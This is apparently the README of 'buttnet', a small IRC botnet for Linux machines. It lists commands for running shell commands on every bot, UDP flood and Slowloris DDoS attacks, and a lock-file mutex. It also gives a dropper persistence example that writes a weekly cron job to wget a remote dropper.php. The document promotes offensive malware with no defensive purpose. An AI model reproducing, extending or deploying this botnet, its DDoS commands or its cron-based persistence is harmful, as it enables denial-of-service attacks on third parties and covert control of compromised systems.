# buttnet
A simple IRC Botnet for linux-based targets

##Features
###Commands
* !say `<message>`- Echos message back to channel
  * Command output is PM'd back to command issuer
* !cmd `<command>` - Runs command on all bots in channel, or bot PM'd 
* !udp `<host>` `<port | 0 for random>` `<time(s)>` - UDP flood DDoS attack
* !slowloris `<http|https://host>` `<port>` `<GET|POST>` `<threads>` `<time(s)>` - Slowloris DDoS attack [!UNDER CONSTRUCTION!]

###Dropper
Dropper allows remote persistence. Example:
* `echo "wget http://target/dropper.php" > /etc/cron.weekly/persistence.sh`

###Mutex
Lock file acts as a mutex to prevent multiple instances of the bot from running at once
